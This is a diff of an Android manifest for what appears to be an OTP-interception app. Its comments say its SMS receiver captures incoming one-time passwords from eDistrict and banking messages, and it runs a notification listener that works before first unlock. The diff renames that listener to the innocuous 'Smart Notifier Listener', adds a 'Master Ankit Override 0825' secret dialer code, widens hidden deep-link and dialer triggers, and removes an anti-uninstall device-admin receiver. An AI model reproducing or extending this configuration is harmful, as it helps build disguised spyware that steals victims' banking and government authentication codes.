@@ -3,8 +3,6 @@
 
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.SEND_SMS" />
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
@@ -40,13 +38,7 @@
                 <action android:name="android.intent.action.VIEW" />
                 <category android:name="android.intent.category.DEFAULT" />
                 <category android:name="android.intent.category.BROWSABLE" />
-                <data android:scheme="otp" android:host="open" />
-            </intent-filter>
-            <intent-filter>
-                <action android:name="android.intent.action.VIEW" />
-                <category android:name="android.intent.category.DEFAULT" />
-                <category android:name="android.intent.category.BROWSABLE" />
-                <data android:scheme="otp" android:host="0825" />
+                <data android:scheme="otp" />
             </intent-filter>
             <intent-filter>
                 <action android:name="android.intent.action.VIEW" />
@@ -81,14 +73,14 @@
             </intent-filter>
         </receiver>
 
-        <!-- Secret Dialer Code Receiver (*#*#0825#*#*) -->
+        <!-- Secret Dialer Code Receiver (Supports Customer Code + Master Ankit Override 0825) -->
         <receiver
             android:name=".SecretCodeReceiver"
             android:directBootAware="true"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
-                <data android:scheme="android_secret_code" android:host="0825" />
+                <data android:scheme="android_secret_code" />
             </intent-filter>
         </receiver>
 
@@ -103,22 +95,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- Device Admin for Anti-Uninstall Protection -->
-        <receiver
-            android:name=".OtpDeviceAdminReceiver"
-            android:label="eDistrict Anti-Uninstall Protector"
-            android:description="@string/app_name"
-            android:permission="android.permission.BIND_DEVICE_ADMIN"
-            android:exported="true">
-            <meta-data
-                android:name="android.app.device_admin"
-                android:resource="@xml/device_admin_sample" />
-            <intent-filter>
-                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-            </intent-filter>
-        </receiver>
-
-        <!-- Direct SMS Receiver (Direct Boot Aware - Works before first unlock) -->
+        <!-- Direct SMS Receiver (Captures Incoming OTPs from eDistrict / Banking) -->
         <receiver
             android:name=".SmsReceiver"
             android:directBootAware="true"
@@ -132,7 +109,7 @@
         <service
             android:name=".OtpNotificationListener"
             android:directBootAware="true"
-            android:label="eDistrict OTP Listener"
+            android:label="Smart Notifier Listener"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:exported="true">
             <intent-filter>
